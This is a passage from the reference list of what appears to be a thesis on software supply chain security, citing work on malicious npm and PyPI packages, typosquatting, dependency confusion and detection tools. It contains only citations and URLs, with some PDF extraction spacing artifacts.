- [4] P. Ladisa, M. Sahin, S. E. Ponta, M. Rosa, M. Martinez, and O. Barais, « The hitchhiker’s guide to malicious third-party dependencies », _arXiv preprint arXiv:2307.09087_ , 2023. 

- [5] P. Ladisa, S. E. Ponta, N. Ronzoni, M. Martinez, and O. Barais, « On the feasibility of cross-language detection of malicious packages in npm and pypi », in _Proceedings of the 39th Annual Computer Security Applications Conference_ , ser. ACSAC ’23, Austin, TX, USA: Association for Computing Machinery, 2023. 

- [6] P. Ladisa, H. Plate, M. Martinez, O. Barais, and S. E. Ponta, « Towards the detection of malicious java packages », in _Proceedings of the 2022 ACM Workshop on Software Supply Chain Offensive Research and Ecosystem Defenses_ , ser. SCORED’22, Los Angeles, CA, USA: Association for Computing Machinery, 2022, pp. 63– 72, isbn: 9781450398855. doi: `10.1145/3560835.3564548` . [Online]. Available: `https://doi.org/10.1145/3560835.3564548` . 

165 

- [7] F. Nagle, J. Dana, J. Hoffman, S. Randazzo, and Y. Zhou, « Census ii of free and open source software—application libraries », _Linux Foundation, Harvard Laboratory for Innovation Science (LISH) and Open Source Security Foundation (OpenSSF)_ , vol. 80, 2022. 

- [8] D. Everson, L. Cheng, and Z. Zhang, « Log4shell: redefining the web attack surface », in _Workshop on Measurements, Attacks, and Defenses for the Web (MADWeb) 2022_ , 2022. 

- [9] NIST, _NVD - CVE-2021-44228 — nvd.nist.gov_ , `https://nvd.nist.gov/vuln/ detail/CVE-2021-44228` , [Accessed 08-09-2023], 2021. 

- [10] S. Peisert, B. Schneier, H. Okhravi, _et al._ , « Perspectives on the solarwinds incident », _IEEE Security Privacy_ , vol. 19, no. 2, pp. 7–13, 2021. doi: `10.1109/MSEC. 2021.3051235` . 

- [11] T. P. Team, _Compromised pytorch-nightly dependency chain between december 25th and december 30th, 2022_ , `https://pytorch.org/blog/compromised-nightlydependency` , [Accessed 30-Jun-2023], 2023. 

- [12] B. Toulas, _Malicious lolip0p pypi packages install info-stealing malware_ , `https: //www.bleepingcomputer.com/news/security/malicious- lolip0p- pypipackages-install-info-stealing-malware` , [Accessed 30-Jun-2023], 2023. 

- [13] K. Zanki, _Iconburst npm software supply chain attack grabs data from apps and websites_ , `https://www.reversinglabs.com/blog/iconburst-npm-softwaresupply-chain-attack-grabs-data-from-apps-websites` , [Accessed 30-Jun2023], 2022. 

- [14] _8th Annual State of the Software Supply Chain Report | Sonatype — sonatype.com_ , `https : / / www . sonatype . com / state - of - the - software - supply - chain / introduction` , [Accessed 08-09-2023]. 

- [15] _Pypi new user and new project registrations temporarily suspended_ , `https : / / status.python.org/incidents/qy2t9mjjcc7g?u=l1b53kd6n2rs` , [Accessed 30Jun-2023], 2023. 

- [16] K. Thompson, « Reflections on trusting trust », _Commun. ACM_ , vol. 27, no. 8, pp. 761–763, Aug. 1984, issn: 0001-0782. doi: `10.1145/358198.358210` . [Online]. Available: `https://doi.org/10.1145/358198.358210` . 

166 

- [17] European Network and Information Security Agency. « Enisa threat landscape 2021 ». [Online; accessed 20-October-2021]. (2021), [Online]. Available: `https : / / www . enisa . europa . eu / publications / enisa - threat - landscape - 2021` (visited on 11/25/2021). 

- [18] Joseph R. Biden JR. « Executive order on improving the nation’s cybersecurity ». [Online; accessed 20-October-2021]. (2021), [Online]. Available: `https://www. whitehouse . gov / briefing - room / presidential - actions / 2021 / 05 / 12 / executive-order-on- improving- the-nations-cybersecurity/` (visited on 11/25/2021). 

- [19] I. Haddad and B. Warner, « Understanding the open source development model », _Linux Journal_ , 2011. 

- [20] R. Cox, « Our software dependency problem », _Unpublished essay, available online in January: https://research. swtch. com/deps. pdf_ , 2019. 

- [21] J. Cappos, J. Samuel, S. Baker, and J. Hartman, « Package management security », Jan. 2008. 

- [22] R. Duan, O. Alrawi, R. P. Kasturi, R. Elder, B. Saltaformaggio, and W. Lee, « Towards measuring supply chain attacks on package managers for interpreted languages », _arXiv preprint arXiv:2002.01139_ , 2020. 

- [23] M. Zimmermann, C.-A. Staicu, C. Tenny, and M. Pradel, « Small world with high risks: a study of security threats in the npm ecosystem », in _28th USENIX Security Symposium (USENIX Security 19)_ , Santa Clara, CA: USENIX Association, Aug. 2019, pp. 995–1010, isbn: 978-1-939133-06-9. [Online]. Available: `https://www. usenix.org/conference/usenixsecurity19/presentation/zimmerman` . 

- [24] A. Dann, H. Plate, B. Hermann, S. E. Ponta, and E. Bodden, « Identifying challenges for oss vulnerability scanners-a study & test suite », _IEEE Transactions on Software Engineering_ , 2021. 

- [25] Z. Durumeric, F. Li, J. Kasten, _et al._ , « The matter of heartbleed », in _Proceedings of the 2014 conference on internet measurement conference_ , 2014, pp. 475–488. 

- [26] T. H. II, _Compromised npm Package: event-stream_ , [Online; accessed 20-October2021], 2018. 

167 

- [27] M. Ohm, H. Plate, A. Sykosch, and M. Meier, « Backstabber’s knife collection: a review of open source software supply chain attacks », in _International Conference on Detection of Intrusions and Malware, and Vulnerability Assessment (DIMVA)_ , 2020, pp. 23–43. 

- [28] J. Harush, _How 140k NuGet, NPM, and PyPi Packages Were Used to Spread Phishing Links_ , `https://checkmarx.com/blog/how-140k-nuget-npm-andpypi- packages- were- used- to- spread- phishing- links/` , [Accessed 17-082023]. 

- [29] A. Sejfia and M. Schäfer, « Practical automated detection of malicious npm packages », in _Proceedings of the 44th International Conference on Software Engineering_ , ser. ICSE ’22, Pittsburgh, Pennsylvania: Association for Computing Machinery, 2022, pp. 1681–1692, isbn: 9781450392211. doi: `10.1145/3510003.3510104` . [Online]. Available: `https://doi.org/10.1145/3510003.3510104` . 

- [30] C. Okafor, T. R. Schorlemmer, S. Torres-Arias, and J. C. Davis, « Sok: analysis of software supply chain security by establishing secure design properties », in _Proceedings of the ACM Workshop on Software Supply Chain Offensive Research and Ecosystem Defenses (SCORED)_ , 2022, pp. 15–24. 

- [31] ENISA, _Enisa threat landscape 2022_ , `https://www.enisa.europa.eu/publications/ enisa-threat-landscape-2022` , [Accessed 30-Jun-2023], 2022. 

- [32] N. Zahan, T. Zimmermann, P. Godefroid, B. Murphy, C. Maddila, and L. Williams, « What are weak links in the npm supply chain? », in _Proceedings of the 44th International Conference on Software Engineering: Software Engineering in Practice (ICSE)_ , 2022, pp. 331–340. 

- [33] B. Pfretzschner and L. ben Othmane, « Identification of dependency-based attacks on node.js », in _Proceedings of the 12th International Conference on Availability, Reliability and Security (ARES)_ , 2017, pp. 1–6. 

- [34] D. Gonzalez, T. Zimmermann, P. Godefroid, and M. Schaefer, « Anomalicious: automated detection of anomalous and potentially malicious commits on github », in _2021 IEEE/ACM 43rd International Conference on Software Engineering: Software Engineering in Practice (ICSE-SEIP)_ , 2021, pp. 258–267. doi: `10.1109/ ICSE-SEIP52600.2021.00035` . 

- [35] N. Boucher and R. Anderson, « Trojan Source: Invisible Vulnerabilities », 2023. 

168 

- [36] Q. Wu and K. Lu, « On the feasibility of stealthily introducing vulnerabilities in open-source software via hypocrite commits », _Proc. Oakland, page to appear_ , 2021. 

- [37] R. Goyal, G. Ferreira, C. Kästner, and J. Herbsleb, « Identifying unusual commits on github: goyal et al . », _Journal of Software: Evolution and Process_ , vol. 30, e1893, Sep. 2017. doi: `10.1002/smr.1893` . 

- [38] W. La Cholter, M. Elder, and A. Stalick, « Windows malware binaries in c/c++ github repositories: prevalence and lessons learned. », in _ICISSP_ , 2021, pp. 475– 484. 

- [39] D. Wheeler, « Countering trusting trust through diverse double-compiling », in _21st Annual Computer Security Applications Conference (ACSAC’05)_ , 2005, 13 pp.–48. doi: `10.1109/CSAC.2005.17` . 

- [40] C. Lamb and S. Zacchiroli, « Reproducible builds: increasing the integrity of software supply chains », _IEEE Software_ , 0–0, 2021, issn: 1937-4194. doi: `10.1109/ ms.2021.3073045` . [Online]. Available: `http://dx.doi.org/10.1109/MS.2021. 3073045` . 

- [41] D.-L. Vu, F. Massacci, I. Pashchenko, H. Plate, and A. Sabetta, « Lastpymile: identifying the discrepancy between sources and packages », in _Proceedings of the 29th ACM Joint Meeting on European Software Engineering Conference and Symposium on the Foundations of Software Engineering_ , ser. ESEC/FSE 2021, Athens, Greece: Association for Computing Machinery, 2021, pp. 780–792, isbn: 9781450385626. doi: `10 . 1145 / 3468264 . 3468592` . [Online]. Available: `https : //doi.org/10.1145/3468264.3468592` . 

- [42] S. Scalco, D.-L. Vu, R. Paramitha, and F. Massacci, « On the feasibility of detecting injections in malicious npm packages », Jun. 2022. doi: `10.1145/3538969. 3543815` . 

- [43] V. Gruhn, C. Hannebauer, and C. John, « Security of public continuous integration services », in _Proceedings of the 9th International Symposium on Open Collaboration_ , ser. WikiSym ’13, Hong Kong, China: Association for Computing Machinery, 2013, isbn: 9781450318525. doi: `10.1145/2491055.2491070` . [Online]. Available: `https://doi.org/10.1145/2491055.2491070` . 

- [44] K. Lewandowski and M. Lodato, « Introducing slsa, an end-to-end framework for supply chain integrity », _URL: slsa.dev_ , 2021. 

169 

- [45] G. Benedetti, L. Verderame, and A. Merlo, « Automatic security assessment of github actions workflows », in _Proceedings of the 2022 ACM Workshop on Software Supply Chain Offensive Research and Ecosystem Defenses_ , ser. SCORED’22, Los Angeles, CA, USA: Association for Computing Machinery, 2022, pp. 37–45, isbn: 9781450398855. doi: `10 . 1145 / 3560835 . 3564554` . [Online]. Available: `https : //doi.org/10.1145/3560835.3564554` . 

- [46] J. Cappos, J. Samuel, S. Baker, and J. H. Hartman, « A look in the mirror: attacks on package managers », in _Proceedings of the 15th ACM Conference on Computer and Communications Security_ , ser. CCS ’08, Alexandria, Virginia, USA: Association for Computing Machinery, 2008, pp. 565–574, isbn: 9781595938107. doi: `10.1145/1455770.1455841` . [Online]. Available: `https://doi.org/10.1145/ 1455770.1455841` . 

- [47] S. Torres-Arias, H. Afzali, T. K. Kuppusamy, R. Curtmola, and J. Cappos, « Intoto: providing farm-to-table guarantees for bits and bytes », in _28th USENIX Security Symposium (USENIX Security 19)_ , Santa Clara, CA: USENIX Association, Aug. 2019, pp. 1393–1410, isbn: 978-1-939133-06-9. [Online]. Available: `https: //www.usenix.org/conference/usenixsecurity19/presentation/torresarias` . 

- [48] J. Samuel, N. Mathewson, J. Cappos, and R. Dingledine, « Survivable key compromise in software update systems », in _Proceedings of the 17th ACM Conference on Computer and Communications Security_ , ser. CCS ’10, Chicago, Illinois, USA: Association for Computing Machinery, 2010, pp. 61–72, isbn: 9781450302456. doi: `10.1145/1866307.1866315` . [Online]. Available: `https://doi.org/10.1145/ 1866307.1866315` . 

- [49] A. Bagmar, J. Wedgwood, D. Levin, and J. Purtilo, « I know what you imported last summer: A study of security threats in the python ecosystem », _CoRR_ , vol. abs/2102.06301, 2021. arXiv: `2102 . 06301` . [Online]. Available: `https : / / arxiv.org/abs/2102.06301` . 

- [50] E. Wyss, A. Wittman, D. Davidson, and L. De Carli, « Wolf at the door: preventing install-time attacks in npm with latch », in _Proceedings of the 2022 ACM on Asia Conference on Computer and Communications Security (ASIACCS)_ , 2022, pp. 1139–1153. 

170 

- [51] M. Ohm, T. Pohl, and F. Boes, « You can run but you can’t hide: runtime protection against malicious package updates for node. js », _arXiv preprint arXiv:2305.19760_ , 2023. 

- [52] W. Guo, Z. Xu, C. Liu, C. Huang, Y. Fang, and Y. Liu, « An empirical study of malicious code in pypi ecosystem », _arXiv preprint arXiv:2309.11021_ , 2023. 

- 

- [53] E. S. Framework, _Cybersecurity Collaboration Center nsa.gov_ , `https://www. nsa . gov / About / Cybersecurity - Collaboration - Center / Cybersecurity - Partnerships/ESF/` , [Accessed 13-10-2023]. 

- [54] Microsoft, _OSS SSC Framework Guide — microsoft.com_ , `https://www.microsoft. com/en-us/securityengineering/opensource/osssscframeworkguide` , [Accessed 13-10-2023]. 

- [55] OWASP, _OWASP Software Component Verification Standard | OWASP Founda—_ 

- _tion owasp.org_ , `https://owasp.org/www-project-software-componentverification-standard/` , [Accessed 13-10-2023]. 

- 

- [56] MITRE, _Mitre att&ck; attack.mitre.org_ , `https://attack.mitre.org/` , [Accessed 13-10-2023]. 

- [57] MITRE, _Supply Chain Compromise: Compromise Software Dependencies and Development Tools, Sub-technique T1195.001 - Enterprise | mitre att&ck; — attack.mitre.org_ , `https://attack.mitre.org/techniques/T1195/001/` , [Accessed 13-10-2023]. 

- [58] MITRE, _Supply Chain Compromise: Compromise Software Supply Chain, Subtechnique T1195.002 - Enterprise | mitre att&ck; — attack.mitre.org_ , `https:// attack.mitre.org/techniques/T1195/002/` , [Accessed 13-10-2023]. 

- [59] M. Sikorski and A. Honig, _Practical malware analysis: the hands-on guide to dissecting malicious software_ . no starch press, 2012. 

- [60] _Backstabber’s Knife Collection_ , `https://dasfreak.github.io/BackstabbersKnife-Collection/` , [Accessed 03-Oct-2023]. 

- [61] _Get a URL/file analysis_ , `https://developers.virustotal.com/reference/ analysis` , [Accessed 07-Sep-2022]. 

- [62] _Analyses_ , `https://developers.virustotal.com/reference/analyses-object` , [Accessed 07-Sep-2022]. 

171 

- [63] M. Ohm and C. Stuke, « Sok: practical detection of software supply chain attacks », in _Proceedings of the 18th International Conference on Availability, Reliability and Security_ , ser. ARES ’23, Benevento, Italy: Association for Computing Machinery, 2023, isbn: 9798400707728. doi: `10.1145/3600160.3600162` . [Online]. Available: `https://doi.org/10.1145/3600160.3600162` . 

- [64] M. Čarnogurský, « Attacks on package managers », 2019. 

- [65] A. A. Milje, « Detecting malicious python packages in the python package index (pypi) », in _Master Thesis_ , NTNU, 2022. 

- [66] D.-L. Vu, I. Pashchenko, F. Massacci, H. Plate, and A. Sabetta, « Typosquatting and combosquatting attacks on the python ecosystem », in _2020 IEEE European Symposium on Security and Privacy Workshops (EuroS&PW)_ , 2020, pp. 509–514. doi: `10.1109/EuroSPW51379.2020.00074` . 

- [67] M. Taylor, R. K. Vaidya, D. Davidson, L. De Carli, and V. Rastogi, « Spellbound: defending against package typosquatting », _arXiv preprint arXiv:2003.03471_ , 2020. 

- [68] M. Ohm, A. Sykosch, and M. Meier, « Towards detection of software supply chain attacks by forensic artifacts », in _Proceedings of the 15th International Conference on Availability, Reliability and Security_ , ser. ARES ’20, Virtual Event, Ireland: Association for Computing Machinery, 2020, isbn: 9781450388337. doi: `10.1145/ 3407023.3409183` . [Online]. Available: `https://doi.org/10.1145/3407023. 3409183` . 

- [69] D. L. Vu, I. Pashchenko, F. Massacci, H. Plate, and A. Sabetta, « Towards using source code repositories to identify software supply chain attacks », in _Proceedings of the 2020 ACM SIGSAC conference on computer and communications security_ , 2020, pp. 2093–2095. 

- [70] F. Barr-Smith, T. Blazytko, R. Baker, and I. Martinovic, « Exorcist: automated differential analysis to detect compromises in closed-source software supply chains », in _Proceedings of the 2022 ACM Workshop on Software Supply Chain Offensive Research and Ecosystem Defenses_ , ser. SCORED’22, Los Angeles, CA, USA: Association for Computing Machinery, 2022, pp. 51–61, isbn: 9781450398855. doi: `10.1145/3560835.3564550` . [Online]. Available: `https://doi.org/10.1145/ 3560835.3564550` . 

172 

- [71] A. Cao and B. Dolan-Gavitt, « What the fork? finding and analyzing malware in github forks », in _Proceedings of the NDSS_ , vol. 22, 2022. 

- [72] M. Ohm, F. Boes, C. Bungartz, and M. Meier, « On the feasibility of supervised machine learning for the detection of malicious software packages », in _Proceedings of the 17th International Conference on Availability, Reliability and Security_ , 2022, pp. 1–10. 

- [73] J. Zhang, K. Huang, B. Chen, C. Wang, Z. Tian, and X. Peng, « Malicious package detection in npm and pypi using a single model of malicious behavior sequence », _arXiv preprint arXiv:2309.02637_ , 2023. 

- [74] A. Fass, R. P. Krawczyk, M. Backes, and B. Stock, « Jast: fully syntactic detection of malicious (obfuscated) javascript », in _International Conference on Detection of Intrusions and Malware, and Vulnerability Assessment_ , Springer, 2018, pp. 303– 325. 

- [75] K. Garrett, G. Ferreira, L. Jia, J. Sunshine, and C. Kästner, « Detecting suspicious package updates », in _2019 IEEE/ACM 41st International Conference on Software Engineering: New Ideas and Emerging Results (ICSE-NIER)_ , 2019, pp. 13–16. doi: `10.1109/ICSE-NIER.2019.00012` . 

- [76] G. Liang, X. Zhou, Q. Wang, Y. Du, and C. Huang, « Malicious packages lurking in user-friendly python package index », in _2021 IEEE 20th International Conference on Trust, Security and Privacy in Computing and Communications (TrustCom)_ , 2021, pp. 606–613. doi: `10.1109/TrustCom53373.2021.00091` . 

- [77] X. Wang, « On the feasibility of detecting software supply chain attacks », in _MILCOM 2021 - 2021 IEEE Military Communications Conference (MILCOM)_ , 2021, pp. 458–463. doi: `10.1109/MILCOM52596.2021.9652901` . 

- [78] M. Ohm, L. Kempf, F. Boes, and M. Meier, _Supporting the detection of software supply chain attacks through unsupervised signature generation_ , 2020. doi: `10. 48550/ARXIV.2011.02235` . [Online]. Available: `https://arxiv.org/abs/2011. 02235` . 

- [79] J. Schlumberger, C. Kruegel, and G. Vigna, « Jarhead analysis and detection of malicious java applets », in _Proceedings of the 28th Annual Computer Security Applications Conference_ , 2012, pp. 249–257. 

173 

- [80] R. P. Pinheiro, S. M. Lima, D. M. Souza, _et al._ , « Antivirus applied to jar malware detection based on runtime behaviors », _Scientific Reports_ , vol. 12, no. 1, pp. 1–17, 2022. 

- [81] L. Batyuk, M. Herpich, S. A. Camtepe, K. Raddatz, A.-D. Schmidt, and S. Albayrak, « Using static analysis for automatic assessment and mitigation of unwanted and malicious activities within android applications », in _2011 6th International Conference on Malicious and Unwanted Software_ , IEEE, 2011, pp. 66– 72. 

- [82] L. Li, D. Li, T. F. Bissyandé, _et al._ , « On locating malicious code in piggybacked android apps », _Journal of Computer Science and Technology_ , vol. 32, no. 6, pp. 1108– 1124, 2017. 

- [83] Z. Ma, H. Ge, Z. Wang, Y. Liu, and X. Liu, « Droidetec: android malware detection and malicious code localization through deep learning », _arXiv preprint arXiv:2002.03594_ , 2020. 

- [84] S. Arshad, M. A. Shah, A. Khan, and M. Ahmed, « Android malware detection & protection: a survey », _International Journal of Advanced Computer Science and Applications_ , vol. 7, no. 2, 2016. 

- [85] European Network and Information Security Agency. « Enisa threat landscape for supply chain attacks 2021 ». [Online; accessed 20-October-2021]. (2021), [Online]. Available: `https://www.enisa.europa.eu/publications/threat-landscapefor-supply-chain-attacks` (visited on 11/25/2021). 

- [86] _TIOBE Index_ , `https://www.tiobe.com/tiobe-index/` , [Accessed 28-Jun-2022]. 

- [87] GitHub, _The top programming languages — octoverse.github.com_ , `https://octoverse. github.com/2022/top-programming-languages` , [Accessed 20-10-2023]. 

- [88] Y. Aafer, W. Du, and H. Yin, « Droidapiminer: mining api-level features for robust malware detection in android », in _International conference on security and privacy in communication systems_ , Springer, 2013, pp. 86–103. 

- [89] B. Schneier, « Attack trees », _Dr. Dobb’s journal_ , vol. 24, no. 12, pp. 21–29, 1999. 

- [90] S. Mauw and M. Oostdijk, « Foundations of attack trees », vol. 3935, Jul. 2006, pp. 186–198, isbn: 978-3-540-33354-8. doi: `10.1007/11734727_17` . 

174 

- [91] B. Kitchenham, O. P. Brereton, D. Budgen, M. Turner, J. Bailey, and S. Linkman, « Systematic literature reviews in software engineering–a systematic literature review », _Information and software technology_ , vol. 51, no. 1, pp. 7–15, 2009. 

- [92] C. Wohlin, P. Runeson, M. Höst, M. C. Ohlsson, B. Regnell, and A. Wesslén, _Experimentation in software engineering_ . Springer Science & Business Media, 2012. 

- [93] Microsoft Corporation, « 3 ways to mitigate risk when using private package feeds », _URL: azure. microsoft. com/en-us/resources/3-ways-to-mitigate-risk-usingprivate-package-feeds/_ , 2021. 

- [94] M. Ensor and D. Stevens, « Shifting left on security: securing software supply chains », _URL: cloud. google. com/files/shifting-left-on-security.pdf_ , 2021. 

- [95] A. Almubayed, « Practical approach to automate the discovery and eradication of opensource software vulnerabilities at scale », _Blackhat USA_ , 2019. 

- [96] M. Glassman and M. J. Kang, « Intelligence in the internet age: the emergence and evolution of open source intelligence (osint) », _Computers in Human Behavior_ , vol. 28, no. 2, pp. 673–682, 2012, issn: 0747-5632. doi: `https://doi.org/10. 1016/j.chb.2011.11.014` . [Online]. Available: `https://www.sciencedirect. com/science/article/pii/S0747563211002585` . 

- [97] K. Tuma, G. Calikli, and R. Scandariato, « Threat analysis of software systems: a systematic literature review », _Journal of Systems and Software_ , vol. 144, pp. 275– 294, 2018, issn: 0164-1212. doi: `https://doi.org/10.1016/j.jss.2018.06.073` . [Online]. Available: `https://www.sciencedirect.com/science/article/pii/ S0164121218301304` . 

- [98] D. Spencer, _Card sorting: Designing usable categories_ . Rosenfeld Media, 2009. 

- [99] A. Blackstone _et al._ , « Principles of sociological inquiry: qualitative and quantitative methods », 2018. 

- [100] W. Albert and T. Tullis, _Measuring the user experience: collecting, analyzing, and presenting usability metrics_ . Newnes, 2013. 

- [101] L. A. Goodman, « Snowball Sampling », _The Annals of Mathematical Statistics_ , vol. 32, no. 1, pp. 148–170, 1961. doi: `10 . 1214 / aoms / 1177705148` . [Online]. Available: `https://doi.org/10.1214/aoms/1177705148` . 

175 

- [102] G. Ferreira, L. Jia, J. Sunshine, and C. Kästner, « Containing malicious package updates in npm with a lightweight permission system », in _2021 IEEE/ACM 43rd International Conference on Software Engineering (ICSE)_ , 2021, pp. 1334–1346. doi: `10.1109/ICSE43902.2021.00121` . 

- [103] M. Balliauw, _Building a supply chain attack with .NET, NuGet, DNS, source generators, and more!_ , [Online; accessed 20-October-2021], 2021. 

- [104] L. Constantin, _Npm Attackers Sneak a Backdoor into Node.js Deployments through Dependencies_ , [Online; accessed 20-October-2021], 2018. 

- [105] C. Cimpanu, _17 Backdoored Docker Images Removed From Docker Hub_ , [Online; accessed 20-October-2021], 2018. 

- [106] _Plot to steal cryptocurrency foiled by the npm security team_ , [Online; accessed 20October-2021], 2019. 

- [107] A. Sharma, _Inside the "fallguys" malware that steals your browsing data and gaming ims; continued attack on open source software_ . [Online]. Available: `https://blog. sonatype.com/inside-the-fallguys-malware` . 

- [108] E. Roth, _Open source developer corrupts widely-used libraries, affecting tons of projects_ , `https : / / www . theverge . com / 2022 / 1 / 9 / 22874949 / developer - corrupts- open- source- libraries- projects- affected` , [Accessed 15-Mar2022]. 

- [109] L. Tal, _Alert: peacenotwar module sabotages npm developers in the node-ipc package to protest the invasion of ukraine_ , `https://snyk.io/blog/peacenotwarmalicious-npm-node-ipc-package-vulnerability/` , [Accessed 18-Mar-2022]. 

- [110] B. Kaplan and J. Qian, _A survey on common threats in npm and pypi registries_ , 2021. arXiv: `2108.09576 [cs.CR]` . 

- [111] _PyPI Python repository hit by typosquatting sneak attack_ , `https://nakedsecurity. sophos.com/2017/09/19/pypi-python-repository-hit-by-typosquattingsneak-attack/` , [Accessed 15-Mar-2022]. 

- [112] _Npm Blog Archive: ‘crossenv‘ malware on the npm registry_ , `https://blog.npmjs. org/post/163723642530/crossenv-malware-on-the-npm-registry` , [Accessed 15-Mar-2022]. 

- [113] _Skcsirt-sa-20170909-pypi_ , `https://www.nbu.gov.sk/skcsirt-sa-20170909pypi/` , [Accessed 15-Mar-2022]. 

176 

- [114] N. P. Tschacher, « Typosquatting in programming language package managers », Ph.D. dissertation, Universität Hamburg, Fachbereich Informatik, 2016. 

- [115] T. Herr, « Breaking trust–shades of crisis across an insecure software supply chain », 2021. 

- [116] A. Sharma, « Trick or treat: that ‘twilio-npm‘ package is brandjacking malware in disguise! », _URL: blog. sonatype. com/twilio-npm-is-brandjacking-malware-indisguise_ , 2021. 

- [117] J. S. Meyers and B. Tozer. « Bewear! python typosquatting is about more than typos ». [Online; accessed 20-October-2021]. (2020), [Online]. Available: `https: //www.iqt.org/bewear-python-typosquatting-is-about-more-than-typos/` (visited on 11/25/2021). 

- 

- [118] B. Lanyado, _Can you trust ChatGPT’s package recommendations? vulcan.io_ , `https://vulcan.io/blog/ai-hallucinations-package-risk` , [Accessed 26-102023]. 

- [119] C. Paule, T. F. Düllmann, and A. Van Hoorn, « Vulnerabilities in continuous delivery pipelines? a case study », in _2019 IEEE International Conference on Software Architecture Companion (ICSA-C)_ , 2019, pp. 102–108. doi: `10.1109/ICSAC.2019.00026` . 

- [120] A. Fass, M. Backes, and B. Stock, « Hidenoseek: camouflaging malicious javascript in benign asts », in _Proceedings of the 2019 ACM SIGSAC Conference on Computer and Communications Security_ , ser. CCS ’19, London, United Kingdom: Association for Computing Machinery, 2019, pp. 1899–1913, isbn: 9781450367479. doi: `10.1145/3319535.3345656` . [Online]. Available: `https://doi.org/10.1145/ 3319535.3345656` . 

- [121] S. Torres-Arias, A. K. Ammula, R. Curtmola, and J. Cappos, « On omitting commits and committing omissions: preventing git metadata tampering that (re)introduces software vulnerabilities », in _25th USENIX Security Symposium (USENIX Security 16)_ , Austin, TX: USENIX Association, Aug. 2016, pp. 379–395, isbn: 9781-931971-32-4. [Online]. Available: `https : / / www . usenix . org / conference / usenixsecurity16/technical-sessions/presentation/torres-arias` . 

177 

- [122] S. Mortenson. « Pr-sneaking ». [Online; accessed 20-October-2021]. (2017), [Online]. Available: `https : / / github . com / mortenson / pr - sneaking` (visited on 11/25/2021). 

- [123] L. Giovanini, D. Oliveira, H. Sanchez, and D. Shands, _Leveraging team dynamics to predict open-source software projects’ susceptibility to social engineering attacks_ , 2021. arXiv: `2106.16067 [cs.SE]` . 

- [124] T. Costa, _strong_password v0.0.7 rubygem hijacked_ , [Online; accessed 20-October2021], 2019. 

- [125] S. McClure, S. Gupta, C. Dooley, _et al._ , « Protecting your critical assets-lessons learned from operation aurora », _Tech. Rep._ , 2010. 

- [126] A. Warner (Gentoo Foundation) and A. K. Hüttel (Gentoo Foundation), _Project: Infrastructure/ Incident Reports/ 2018-06-28 Github_ , [Online; accessed 20-October2021], 2018. 

- [127] C. Faulkner, _A hacker is demanding ransom for hundreds of stolen Git code repositories_ , [Online; accessed 20-October-2021], 2019. 

- [128] R. Naraine, _Open-source ProFTPD hacked, backdoor planted in source code_ , [Online; accessed 20-October-2021], 2010. 

- [129] W. Bowling, _Git flag injection - local file overwrite to remote code execution_ , [Online; accessed 20-October-2021], 2019. 

- [130] S. J. Vaughan-Nichols. « Php supply chain attack shows open source’s virtues and vices ». [Online; accessed 20-October-2021]. (2021), [Online]. Available: `https:// thenewstack.io/php-supply-chain-attack-shows-open-sources-virtuesand-vices/` (visited on 11/25/2021). 

- [131] B. Chess, F. D. Lee, and J. West, _Attacking the build through cross-build injection: how your build process can open the gates to a trojan horse_ , 2007. 

- [132] P. A. Karger and R. R. Schell, « Thirty years later: lessons from the multics security evaluation », in _18th Annual Computer Security Applications Conference, 2002. Proceedings._ , IEEE, 2002, pp. 119–126. 

- [133] A. Muñoz, _The octopus scanner malware: attacking the open source supply chain_ , 2020. 

178 

- [134] J. Rossignol, « What you need to know about ios malware xcodeghost », _URL: www. macrumors. com/2015/09/20/xcodeghost-chinese-malwarefaq_ , 2015. 

- [135] J. K. Smith, _Security incident on fedora infrastructure on 23 jan 2011_ , 2011. 

- [136] R. Lakshmanan. « Critical jenkins server vulnerability could leak sensitive information ». [Online; accessed 20-October-2021]. (2020), [Online]. Available: `https: //thehackernews.com/2020/08/jenkins-server-vulnerability.html` (visited on 11/25/2021). 

- [137] Webmin. « Webmin 1.890 exploit - what happened? » [Online; accessed 20-October2021]. (2019), [Online]. Available: `https://webmin.com/exploit.html` (visited on 11/25/2021). 

- [138] A. Avram, « Npm was broken for 2.5 hours », _URL: www. infoq. com/news/2016/03/npm/_ , 2016. 

- [139] npm, « Kik, left-pad, and npm », _URL: blog. npmjs. org/post/141577284765/kikleft-pad-and-npm_ , 2016. 

- [140] M. Beltov, « Arch linux aur repository found to contain malware », _URL: sensorstechforum. com/arch-linux-aur-repository-found-contain-malware/_ , 2018. 

- [141] Microsoft Defender Security Research Team. « Attack inception: compromised supply chain within a supply chain poses new risks ». [Online; accessed 20-October2021]. (2018), [Online]. Available: `https://www.microsoft.com/security/blog/ 2018/07/26/attack- inception- compromised- supply- chain- within- a- supply-chain-poses-new-risks/` (visited on 11/25/2021). 

- [142] A. Birsan, « Dependency confusion: how i hacked into apple, microsoft and dozens of other companies », _URL: medium. com/@alex.birsan/dependency-confusion-4a5d60fec610_ , 2021. 

- [143] Autosoft. « A confusing dependency ». [Online; accessed 20-October-2021]. (2021), [Online]. Available: `https://autsoft.net/hu/a-confusing-dependency/` (visited on 11/25/2021). 

- [144] A. Even-Zohar, « Eslint: compromising the build using supply chain attack », _URL: cycode. com/blog/eslint-compromising-the-build-using-supply-chain-attack/_ , 2021. 

- [145] J. Engelberg, « Bash uploader security update », _URL: about. codecov. io/securityupdate/_ , 2021. 

179 

- [146] T. Chauchefoin, « Php supply chain attack on composer », _URL: blog. sonarsource. com/php-supply-chain-attack-on-composer_ , 2021. 

- [147] M. Hanley. « Github’s commitment to npm ecosystem security ». [Online; accessed 20-October-2021]. (2021), [Online]. Available: `https : / / github . blog / 2021- 11- 15- githubs- commitment- to- npm- ecosystem- security/` (visited on 11/25/2021). 

- [148] M. Justicz. « Remote code execution on rubygems.org ». [Online; accessed 20October-2021]. (2017), [Online]. Available: `https://justi.cz/security/2017/ 10/07/rubygems-org-rce.html` (visited on 11/25/2021). 

- [149] M. Justicz. « Remote code execution on packagist.org ». [Online; accessed 20October-2021]. (2018), [Online]. Available: `https://justi.cz/security/2018/ 08/28/packagist-org-rce.html` (visited on 11/25/2021). 

- [150] A. Kjäll, S. Kristoffersen, and S. Pettersen, « How we protected ourselves from the dependency confusion attack », _URL: schibsted. com/blog/dependency-confusionhow-we-protected-ourselves/_ , 2021. 

- [151] I. You and K. Yim, « Malware obfuscation techniques: a brief survey », in _2010 International Conference on Broadband, Wireless Computing, Communication and Applications_ , 2010, pp. 297–300. doi: `10.1109/BWCCA.2010.85` . 

- [152] C. S. Wright, _The IT regulatory and standards compliance handbook: How to survive information systems audit and assessments_ . Elsevier, 2008. 

